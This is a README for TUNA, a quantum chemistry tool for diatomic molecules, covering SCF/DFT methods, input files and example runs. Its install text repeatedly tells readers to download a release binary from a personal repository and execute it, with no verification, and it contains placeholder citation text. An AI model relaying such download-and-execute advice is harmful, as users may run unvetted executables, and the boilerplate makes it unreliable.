TUNA: Intuitive Quantum Chemistry for Diatomic Molecules
=======================================================

[![Releases](https://img.shields.io/github/v/release/akshaygodara29/TUNA?label=Releases&color=blue)](https://github.com/akshaygodara29/TUNA/releases)  [![Build Status](https://img.shields.io/badge/build-passing-brightgreen)](https://github.com/akshaygodara29/TUNA)  [![Topics](https://img.shields.io/badge/topics-computational--chemistry%20%7C%20modeling-blue)](https://github.com/akshaygodara29/TUNA)

[![Molecule](https://upload.wikimedia.org/wikipedia/commons/6/69/Atomic_orbitals.svg)](https://en.wikipedia.org/wiki/Atomic_orbital)

A compact, user-friendly quantum chemistry tool for diatomic systems. TUNA focuses on accurate potential energy curves, spectroscopic constants, and simple wavefunction analysis. It runs on Linux, macOS, and Windows (WSL) and uses compact input that fits a single file.

Badges and Topics
-----------------
- computational-chemistry
- modeling
- molecular-modeling
- molecular-physics
- molecular-simulation
- quantum-chem
- quantum-chemistry
- quantum-chemistry-programs
- simulation
- theoretical-chemistry
- theoretical-physics
- tuna

Core Features
-------------
- Fast self-consistent field (SCF) solver for diatomics.
- Support for Gaussian, STO, and Slater-type basis functions.
- Analytical and numerical potential energy curves (PEC).
- Vibrational levels via 1D Schrödinger solver and Dunham analysis.
- Spectroscopic constants: Re, De, ωe, ωexe, Be.
- Multi-level treatment: Hartree-Fock (HF), Density Functional Theory (DFT), and simple post-HF corrections (MP2-like).
- Population analysis: Mulliken and Löwdin.
- Orbital plots and density output for visualization.
- Simple scripting API for batch scans of bond lengths.
- Built-in support for common diatomic file formats and plain-text inputs.

Why TUNA
--------
TUNA targets diatomics. That focus gives a compact code base and clear UX. You can run complete PEC scans with a single command. The code uses common quantum chemistry concepts: SCF convergence, basis contraction, exchange-correlation functionals, and Born–Oppenheimer separation. TUNA trades full generality for speed and clarity. It works well for teaching, method testing, and small research tasks that need many PEC points.

Quick links
-----------
- Releases and downloadable binaries: https://github.com/akshaygodara29/TUNA/releases — download the release file and execute it for your platform.
- Repository: https://github.com/akshaygodara29/TUNA

Install and Run
---------------
Download the release package for your OS from https://github.com/akshaygodara29/TUNA/releases and execute the file you download.

Examples:
- Linux (tar + run)
```
tar -xzf tuna-v1.2.0-linux.tar.gz
cd tuna-v1.2.0-linux
./tuna --input h2.inp
```

- macOS (dmg or binary)
```
# If a dmg is provided, mount and copy. If a binary, unpack and run:
./tuna-macos -i li2.inp
```

- Windows (exe or WSL)
```
# Native exe:
tuna.exe --input o2.inp

# WSL:
tar -xzf tuna-v1.2.0-linux.tar.gz
./tuna --input n2.inp
```

If the release link does not work for any reason, check the Releases section on the repo page.

Input format
------------
TUNA uses a single plain text input file. The syntax stays simple. A minimal H2 input looks like:

```
molecule H2
  atoms
    H 0.0 0.0 0.0
    H 0.0 0.0 0.74
  end

method hf
basis sto-3g
scf
  maxiter 200
  tol 1e-8
end

scan
  bond 0.4 3.0 100
  output pec.dat
end
```

You can change "method" to dft and select a functional:
```
method dft
  functional pbe0
end
```

Output
------
TUNA writes plain text and optional binary data for plotting. Key outputs:
- PEC table: bond length vs total energy, in hartree or eV.
- Vibrational levels: eigenvalues of the 1D nuclear Schrödinger equation.
- Spectroscopic constants: Re, De, ωe, ωexe, Be.
- Orbital coefficients and Mulliken populations.
- Density cube or Gaussian cube files for visualizers (optional).

Sample PEC entry:
```
# R(Å)   Energy(Ha)    E(eV)
0.40     -1.073221     -29.216
...
0.74     -1.165441     -31.718  # equilibrium region
```

Usage patterns
--------------
- PEC scan and vibrational levels:
```
./tuna --input h2.inp --scan
# Produces pec.dat and vib_levels.txt
```

- Single-point energy and orbitals:
```
./tuna -i li2_sp.inp --single-point
# Writes orbitals.cube for visualization
```

- Batch scripts:
TUNA accepts a small scripting block to loop over basis sets or methods. Use the "batch" block in the input file.

Theory and methods
------------------
TUNA implements standard quantum chemistry methods tuned for diatomics.

- SCF engine: iterative diagonalization of the Fock matrix with DIIS acceleration. Convergence criteria include density matrix RMS and energy change.
- Basis sets: STO-3G, 6-31G, 6-311G*, and custom Gaussian contraction. You may supply a custom basis section in the input file.
- DFT: local, GGA, and hybrid functionals (LDA, PBE, B3LYP, PBE0). The code uses grid-based numerical integration for exchange-correlation contributions with radial grids adapted to diatomic symmetry.
- Correlation: a low-cost MP2-like correction for single-reference systems. Use for rough post-SCF corrections.
- Nuclear motion: TUNA solves the 1D nuclear Schrödinger equation on a mapped grid. It supports finite-difference and DVR methods and returns eigenvalues and wavefunctions.
- Spectroscopy: Dunham fits for spectroscopic constants and rotational constants from computed PEC.

Benchmarks and performance
--------------------------
TUNA focuses on speed and reproducibility for diatomic problems.

- Typical HF/DFT single-point for H2 with minimal basis: < 0.1 s on modern CPU.
- PEC scan of 100 points for Li2 (6-31G) with DFT: under a minute on a 4-core laptop.
- Memory footprint stays low since the code only allocates matrices needed for two atoms.

These values depend on your CPU, compiler, and input options.

Visualization
-------------
TUNA exports cube files for orbitals and electron density. Use common viewers:

- VMD
- Jmol
- GaussView (for .cube)

Example orbital export:
```
orbitals
  save highest_occupied.ho.cube
  save lowest_unoccupied.lu.cube
end
```

Testing and validation
----------------------
TUNA includes unit tests for SCF, basis handling, and PEC generation. Run tests with the test harness in the release package.

```
./tuna-test --run-all
```

Contributing
------------
- Fork the repo.
- Create a feature branch.
- Add tests for new behavior.
- Open a pull request with a clear description.

Report issues with examples that reproduce the behavior. Use the Issues tab on GitHub for bug reports and feature requests.

Data formats and compatibility
------------------------------
- Input: plain text with simple blocks. Parsers in other languages can generate input.
- Output: plain text tables, .cube files, and simple binary for fast restart.
- Interop: TUNA reads simple XYZ files and can export PEC to CSV for plotting tools.

Licensing
---------
TUNA ships with an open-source license. See the LICENSE file in the release package for details.

Citing TUNA
-----------
If you use TUNA in a publication, cite as:

Author(s) — TUNA: A user-friendly quantum chemistry program for diatomics. GitHub release. Include the release tag and commit hash.

Support and contact
-------------------
Open issues on GitHub for bugs and feature requests. Use pull requests for code contributions.

Related links and resources
---------------------------
- Releases (download and run the release file): https://github.com/akshaygodara29/TUNA/releases
- Common reading on diatomic PEC and spectroscopy:
  - Born–Oppenheimer approximation
  - Dunham expansion
  - Mulliken population analysis

Examples and recipes
--------------------
1) Compute PEC and vibrational levels for H2 with STO-3G
```
molecule H2
  atoms
    H  0.0 0.0 0.0
    H  0.0 0.0 0.4
  end

method hf
basis sto-3g

scan
  bond 0.3 3.0 120
  output h2_pec.dat
end
```

2) Single-point DFT for Li2 with 6-31G*
```
molecule Li2
  atoms
    Li 0.0 0.0 0.0
    Li 0.0 0.0 2.7
  end

method dft
  functional b3lyp
end

basis 6-31g*
single_point
  output li2_sp.out
  save orbitals li2_orb.cube
end
```

Advanced tips
-------------
- Use DIIS settings to control SCF stability.
- Increase grid points for DFT when you need higher accuracy near equilibrium.
- For near-degenerate systems, monitor occupation numbers and spin state.

Images and visuals
------------------
- Orbital gallery: generate .cube files and view with VMD or Jmol.
- PEC plots: load pec.dat into matplotlib, gnuplot, or Excel.

License and credits
-------------------
See the LICENSE file in the release package for the full license text. Contributors appear in the repository history.

Legal and distribution
----------------------
Binaries and source are available via the Releases page. Download the appropriate release file and execute it.